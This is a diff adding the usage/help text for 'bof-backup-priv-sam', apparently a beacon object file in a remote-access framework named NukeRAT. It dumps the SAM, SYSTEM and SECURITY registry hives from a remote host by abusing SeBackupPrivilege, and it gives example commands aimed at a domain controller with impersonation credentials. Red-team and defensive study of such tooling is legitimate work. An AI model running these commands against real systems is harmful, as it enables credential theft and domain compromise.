@@ -1,0 +1,23 @@
+ABOUT
+    Abuses SeBackupPrivilege via remote registry to dump SAM, SYSTEM, and
+    SECURITY hives from a remote system.
+USAGE:
+    bof-backup-priv-sam --- <target> <saveFolder> [domain] [username] [password]
+
+ARGUMENTS:
+    target              Remote computer UNC path (example: \\dc01.contoso.local)
+    saveFolder          Remote folder to save hive files (example: C:\)
+    domain              Optional domain for impersonation
+    username            Optional username for impersonation
+    password            Optional password for impersonation
+
+EXAMPLES:
+    bof-backup-priv-sam --- \\dc01.contoso.local C:\
+    bof-backup-priv-sam --- \\dc01.contoso.local C:\ CONTOSO backup_service Password123
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-backup-priv-sam -w 60 --- \\dc01.contoso.local C:\
